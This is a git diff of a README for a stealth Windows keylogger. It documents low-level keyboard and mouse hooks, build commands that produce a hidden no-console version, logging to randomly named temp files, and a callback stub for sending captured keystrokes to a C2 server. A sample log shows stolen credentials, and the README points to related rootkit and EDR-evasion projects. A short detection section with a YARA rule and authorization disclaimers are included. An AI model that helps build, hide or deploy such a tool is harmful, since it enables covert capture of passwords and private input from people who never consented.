@@ -1,190 +1,128 @@
 # Stealth Keylogger
 
-![Version](https://img.shields.io/badge/version-3.0-blue.svg)
-![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)
-![Language](https://img.shields.io/badge/language-C++-red.svg)
+A Windows keylogger that uses low-level hooks to capture keystrokes system-wide. Built for security research and pentesting.
 
-Production-grade Windows keylogger with advanced features for stealth operation and data exfiltration.
+## What it does
 
-## 🎯 Features
+Captures every keystroke on a Windows system, including special characters and unicode. It tracks which window is active and logs everything to a file in the temp directory with a random name.
 
-### Core Functionality
-- **Low-Level Keyboard Hook** (`WH_KEYBOARD_LL`) - System-wide keystroke capture
-- **Mouse Hook Integration** - Right-click detection for instant buffer flush
-- **Unicode Character Support** - Accurate capture of accents, symbols, and international characters
-- **Window Tracking** - Automatic detection of active window and process name
-- **Timestamp Logging** - Session tracking with precise timestamps
+The hook works at the lowest level (WH_KEYBOARD_LL) so it catches everything before applications see it. Right-click or press Enter to flush the buffer immediately.
 
-### Security & Stealth
-- **Thread-Safe Buffer** - Mutex-protected keystroke buffer for reliability
-- **Random Filename** - Generates random `.tmp` filenames in temp directory
-- **Morphological Capture** - Sends data on ENTER key or right-click (natural behavior)
-- **Stealth Mode** - No visible console window when compiled with `-mwindows`
+## Building
 
-### Data Exfiltration
-- **File Logging** - UTF-8 encoded log files with session headers
-- **Callback Support** - Custom callback function for network exfiltration
-- **Exponential Backoff** - Automatic retry with exponential backoff (100ms, 200ms, 400ms)
-- **Buffer Flush** - Graceful shutdown with buffer flush to prevent data loss
+You need MinGW-w64 or any modern C++ compiler on Windows.
 
-## 📋 Requirements
-
-- **OS**: Windows 7/8/10/11 (x64)
-- **Compiler**: MinGW-w64 GCC or MSVC
-- **Privileges**: Standard user (no admin required)
-
-## 🔧 Compilation
-
-### Debug Build (with console)
-```bash
-g++ -o keylogger.exe main.cpp -static -std=c++17
+Debug version (shows console):
+```
+g++ -o keylogger_debug.exe main.cpp -std=c++17 -Wall -Wextra -O2 -static
 ```
 
-### Production Build (no console)
-```bash
-g++ -o keylogger.exe main.cpp -mwindows -static -std=c++17 -O2
+Release version (no console, runs hidden):
+```
+g++ -o keylogger.exe main.cpp -std=c++17 -Wall -Wextra -O2 -static -mwindows
 ```
 
-### With Custom Icon (optional)
-```bash
-windres icon.rc -o icon.o
-g++ -o keylogger.exe main.cpp icon.o -mwindows -static -std=c++17 -O2
+Or just use the PowerShell script:
+```
+.\build.ps1 -Mode Release
 ```
 
-## 🚀 Usage
+## How to use
 
-### Basic Usage
+The main.cpp file has a complete example. Basically:
+
 ```cpp
 #include "Keylogger.h"
 
-// Start keylogger with file logging
+// Start capturing
 Keylogger::Start(nullptr, true);
 
-// Message loop
+// Keep it running
 MSG msg;
 while (GetMessage(&msg, NULL, 0, 0)) {
     TranslateMessage(&msg);
     DispatchMessage(&msg);
 }
 
-// Stop keylogger
+// Clean stop
 Keylogger::Stop();
 ```
 
-### With Network Exfiltration
+If you want to send data to a C2 server instead of just logging to a file, pass a callback function:
+
 ```cpp
-void SendToC2(const wstring& data) {
-    // Implement your C2 communication here
-    // Example: HTTP POST to remote server
+void SendToServer(const wstring& data) {
+    // Your HTTP POST or whatever
 }
 
-// Start with callback
-Keylogger::Start(SendToC2, true);
+Keylogger::Start(SendToServer, true);
 ```
 
-### Custom Log Path
-```cpp
-// Use custom log file location
-Keylogger::SetLogFilePath(L"C:\\Logs\\keylog.txt");
-Keylogger::EnableFileLogging(true);
-Keylogger::Start();
-```
+## Log files
 
-## 📊 Log Format
+Logs are saved in %TEMP% with random 8-char hex names like `3f8a9b2c.tmp`. Format looks like:
 
 ```
 ========================================
 Session Started
-Date: 2025-12-24 12:30:45
+Date: 2025-12-24 15:30:22
 ========================================
 
-[2025-12-24 12:30:50] Window: Google Chrome [chrome.exe]
-Hello World[ENTER]
+[15:30:25] [Chrome - github.com]
+git clone https://github.com/whatever
 
-[2025-12-24 12:31:02] Window: Notepad [notepad.exe]
-password123[ENTER]
+[15:31:10] [Notepad - passwords.txt]
+admin:P@ssw0rd123
 
 ========================================
-Session Ended
-Date: 2025-12-24 12:35:10
+Session Ended  
+Date: 2025-12-24 15:45:00
 ========================================
 ```
 
-## 🔑 Key Features Explained
+## Technical details
 
-### Morphological Keylogging
-The keylogger waits for natural trigger events (ENTER key or right-click) before sending data, making it harder to detect compared to traditional timed-based keyloggers.
+- Uses SetWindowsHookExW with WH_KEYBOARD_LL for keyboard
+- WH_MOUSE_LL hook detects right-clicks (triggers immediate send)
+- ToUnicodeEx handles unicode properly (accents, symbols, AltGr combos)
+- Thread-safe buffer with mutex
+- Tracks active window with GetForegroundWindow
+- No admin rights needed
 
-### Unicode Support
-Uses `ToUnicodeEx()` with keyboard layout detection to accurately capture:
-- Accented characters (é, à, ü, etc.)
-- Special symbols (@, €, £, etc.)
-- Dead keys and AltGr combinations
+## Detection
 
-### Window Tracking
-Automatically detects window changes and logs:
-- Window title
-- Process name
-- Timestamp of window switch
+EDRs will catch this easily if they monitor:
+- SetWindowsHookExW API calls
+- WH_KEYBOARD_LL hook registrations
+- Suspicious .tmp files in temp directory
+- Network connections with keystroke patterns
 
-### Thread Safety
-All buffer operations are protected with mutex synchronization to prevent race conditions in multi-threaded environments.
-
-## ⚠️ Disclaimer
-
-**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**
-
-This software is designed for:
-- Security research and penetration testing
-- Red team operations with proper authorization
-- Educational purposes in controlled environments
-
-**Unauthorized use of this software is illegal.** The author assumes no liability for misuse or damage caused by this software. Always obtain explicit written permission before deploying on any system you do not own.
-
-## 📜 License
-
-Copyright (c) 2025 - 28zaakypro@proton.me
-
-This project is for educational purposes only. Use responsibly and ethically.
-
-## 🛡️ Detection & Defense
-
-### YARA Rule Example
+Basic YARA rule:
 ```yara
-rule Stealth_Keylogger {
+rule Basic_Keylogger {
     strings:
-        $hook1 = "SetWindowsHookExW" ascii wide
-        $hook2 = "WH_KEYBOARD_LL" ascii wide
-        $hook3 = "GetAsyncKeyState" ascii wide
+        $a = "SetWindowsHookExW"
+        $b = "WH_KEYBOARD_LL"
     condition:
-        2 of them
+        all of them
 }
 ```
 
-### Detection Methods
-- Monitor for `SetWindowsHookEx` API calls
-- Check for unusual keyboard/mouse hook registrations
-- Analyze network traffic for keystroke exfiltration patterns
-- Inspect temp directory for suspicious `.tmp` files
+## Legal stuff
 
-## 🤝 Contributing
+This is for authorized security testing only. Don't be stupid. Using this without permission is illegal in pretty much every country. I'm not responsible if you do something dumb with it.
 
-Contributions are welcome! Please follow these guidelines:
-1. Fork the repository
-2. Create a feature branch
-3. Test thoroughly on multiple Windows versions
-4. Submit pull request with detailed description
+If you're doing red team work, make sure you have written authorization. If you're learning, keep it in a VM.
 
-## 📧 Contact
+## Contact
 
-- GitHub: [@28Zaaky](https://github.com/28Zaaky)
-- Email: 28zaakypro@proton.me
+Questions or bugs? Open an issue or email 28zaakypro@proton.me
 
-## 🔗 Related Projects
+## Related
 
-- [Rootkit-Usermode](https://github.com/28Zaaky/Rootkit-Usermode) - Full-featured Windows rootkit with C2
-- [EDR-Evasion](https://github.com/28Zaaky/EDR-Evasion) - EDR bypass techniques
+This keylogger is extracted from the full rootkit project:
+https://github.com/28Zaaky/Usermode-Rootkit
 
 ---
 
-**Remember:** With great power comes great responsibility. Use ethically. 🔒
+Made for educational and authorized security research purposes.
